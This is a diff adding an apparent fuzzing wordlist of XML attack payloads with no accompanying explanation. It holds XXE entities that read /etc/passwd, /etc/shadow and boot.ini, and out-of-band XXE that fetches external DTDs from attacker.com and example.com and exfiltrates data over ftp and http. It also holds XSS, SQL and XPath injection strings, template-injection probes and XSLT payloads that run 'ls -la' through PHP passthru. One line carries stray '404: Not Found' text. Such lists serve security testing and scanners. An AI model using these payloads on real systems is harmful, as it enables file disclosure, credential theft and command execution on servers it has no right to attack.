@@ -1,0 +1,214 @@
+%
+*
+*/*
++
+-
+/
+//
+//*
+:
+;
+@
+@*
+]>
+$
+0
+0.00005
+0.1
+0.9
+-1
+1
+1.7976931348623157e+308
+5e-10
+5e-324
+&apos;XoiZR
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<test></test>]]>
+count(/child::node())
+<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///etc/passwd">
+<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM "file:///c:/boot.ini">
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
+<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>">
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >
+false
+%foo;
+&foo;
+<foo><![CDATA[' or 1=1 or ''=']]></foo>
+<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://xss.rocks/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+&lt;Tnn96&gt;
+&lt;% Tnn96 %&gt;
+&lt;%= Tnn96 %&gt;
+&lt;? Tnn96 ?&gt;
+&lt;?Tnn96 ?&gt;
+<name>','')); phpinfo(); exit;/*</name>
+null
+' or ''='
+' or '1'='1
+&quot;XoiZR
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<test></test>
+(Tnn96)
+[Tnn96]
+{= Tnn96}
+{{= Tnn96}}
+{{Tnn96}}
+{Tnn96}
+true
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml>
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test0 SYSTEM "file:///etc/passwd">]><root>&test0;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test10 SYSTEM "file:///etc/passwd">]><root>&test10;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test11 SYSTEM "file:///etc/passwd">]><root>&test11;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test12 SYSTEM "file:///etc/passwd">]><root>&test12;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test13 SYSTEM "file:///etc/passwd">]><root>&test13;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test14 SYSTEM "file:///etc/passwd">]><root>&test14;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test15 SYSTEM "file:///etc/passwd">]><root>&test15;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test16 SYSTEM "file:///etc/passwd">]><root>&test16;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test17 SYSTEM "file:///etc/passwd">]><root>&test17;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test18 SYSTEM "file:///etc/passwd">]><root>&test18;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test19 SYSTEM "file:///etc/passwd">]><root>&test19;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test1 SYSTEM "file:///etc/passwd">]><root>&test1;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test20 SYSTEM "file:///etc/passwd">]><root>&test20;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test21 SYSTEM "file:///etc/passwd">]><root>&test21;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test22 SYSTEM "file:///etc/passwd">]><root>&test22;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test23 SYSTEM "file:///etc/passwd">]><root>&test23;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test24 SYSTEM "file:///etc/passwd">]><root>&test24;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test25 SYSTEM "file:///etc/passwd">]><root>&test25;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test26 SYSTEM "file:///etc/passwd">]><root>&test26;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test27 SYSTEM "file:///etc/passwd">]><root>&test27;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test28 SYSTEM "file:///etc/passwd">]><root>&test28;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test29 SYSTEM "file:///etc/passwd">]><root>&test29;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test2 SYSTEM "file:///etc/passwd">]><root>&test2;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test30 SYSTEM "file:///etc/passwd">]><root>&test30;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test31 SYSTEM "file:///etc/passwd">]><root>&test31;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test32 SYSTEM "file:///etc/passwd">]><root>&test32;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test33 SYSTEM "file:///etc/passwd">]><root>&test33;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test34 SYSTEM "file:///etc/passwd">]><root>&test34;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test35 SYSTEM "file:///etc/passwd">]><root>&test35;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test36 SYSTEM "file:///etc/passwd">]><root>&test36;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test37 SYSTEM "file:///etc/passwd">]><root>&test37;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test38 SYSTEM "file:///etc/passwd">]><root>&test38;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test39 SYSTEM "file:///etc/passwd">]><root>&test39;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test3 SYSTEM "file:///etc/passwd">]><root>&test3;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test40 SYSTEM "file:///etc/passwd">]><root>&test40;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test41 SYSTEM "file:///etc/passwd">]><root>&test41;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test42 SYSTEM "file:///etc/passwd">]><root>&test42;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test43 SYSTEM "file:///etc/passwd">]><root>&test43;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test44 SYSTEM "file:///etc/passwd">]><root>&test44;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test45 SYSTEM "file:///etc/passwd">]><root>&test45;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test46 SYSTEM "file:///etc/passwd">]><root>&test46;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test47 SYSTEM "file:///etc/passwd">]><root>&test47;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test48 SYSTEM "file:///etc/passwd">]><root>&test48;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test49 SYSTEM "file:///etc/passwd">]><root>&test49;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test4 SYSTEM "file:///etc/passwd">]><root>&test4;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test50 SYSTEM "file:///etc/passwd">]><root>&test50;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test51 SYSTEM "file:///etc/passwd">]><root>&test51;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test52 SYSTEM "file:///etc/passwd">]><root>&test52;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test53 SYSTEM "file:///etc/passwd">]><root>&test53;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test54 SYSTEM "file:///etc/passwd">]><root>&test54;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test55 SYSTEM "file:///etc/passwd">]><root>&test55;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test56 SYSTEM "file:///etc/passwd">]><root>&test56;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test57 SYSTEM "file:///etc/passwd">]><root>&test57;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test58 SYSTEM "file:///etc/passwd">]><root>&test58;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test59 SYSTEM "file:///etc/passwd">]><root>&test59;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test5 SYSTEM "file:///etc/passwd">]><root>&test5;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test60 SYSTEM "file:///etc/passwd">]><root>&test60;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test61 SYSTEM "file:///etc/passwd">]><root>&test61;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test62 SYSTEM "file:///etc/passwd">]><root>&test62;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test63 SYSTEM "file:///etc/passwd">]><root>&test63;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test64 SYSTEM "file:///etc/passwd">]><root>&test64;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test65 SYSTEM "file:///etc/passwd">]><root>&test65;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test66 SYSTEM "file:///etc/passwd">]><root>&test66;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test67 SYSTEM "file:///etc/passwd">]><root>&test67;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test68 SYSTEM "file:///etc/passwd">]><root>&test68;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test69 SYSTEM "file:///etc/passwd">]><root>&test69;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test6 SYSTEM "file:///etc/passwd">]><root>&test6;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test70 SYSTEM "file:///etc/passwd">]><root>&test70;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test71 SYSTEM "file:///etc/passwd">]><root>&test71;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test72 SYSTEM "file:///etc/passwd">]><root>&test72;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test73 SYSTEM "file:///etc/passwd">]><root>&test73;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test74 SYSTEM "file:///etc/passwd">]><root>&test74;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test75 SYSTEM "file:///etc/passwd">]><root>&test75;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test76 SYSTEM "file:///etc/passwd">]><root>&test76;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test77 SYSTEM "file:///etc/passwd">]><root>&test77;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test78 SYSTEM "file:///etc/passwd">]><root>&test78;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test79 SYSTEM "file:///etc/passwd">]><root>&test79;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test7 SYSTEM "file:///etc/passwd">]><root>&test7;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test80 SYSTEM "file:///etc/passwd">]><root>&test80;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test81 SYSTEM "file:///etc/passwd">]><root>&test81;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test82 SYSTEM "file:///etc/passwd">]><root>&test82;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test83 SYSTEM "file:///etc/passwd">]><root>&test83;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test84 SYSTEM "file:///etc/passwd">]><root>&test84;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test85 SYSTEM "file:///etc/passwd">]><root>&test85;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test86 SYSTEM "file:///etc/passwd">]><root>&test86;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test87 SYSTEM "file:///etc/passwd">]><root>&test87;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test88 SYSTEM "file:///etc/passwd">]><root>&test88;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test89 SYSTEM "file:///etc/passwd">]><root>&test89;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test8 SYSTEM "file:///etc/passwd">]><root>&test8;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test90 SYSTEM "file:///etc/passwd">]><root>&test90;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test91 SYSTEM "file:///etc/passwd">]><root>&test91;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test92 SYSTEM "file:///etc/passwd">]><root>&test92;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test93 SYSTEM "file:///etc/passwd">]><root>&test93;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test94 SYSTEM "file:///etc/passwd">]><root>&test94;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test95 SYSTEM "file:///etc/passwd">]><root>&test95;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test96 SYSTEM "file:///etc/passwd">]><root>&test96;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test97 SYSTEM "file:///etc/passwd">]><root>&test97;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test98 SYSTEM "file:///etc/passwd">]><root>&test98;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test99 SYSTEM "file:///etc/passwd">]><root>&test99;</root>404: Not Found
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test9 SYSTEM "file:///etc/passwd">]><root>&test9;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/boot.ini">]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/evil.dtd">]><root>&test;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>"
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>"
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>"
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>"
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example:443" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>"
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
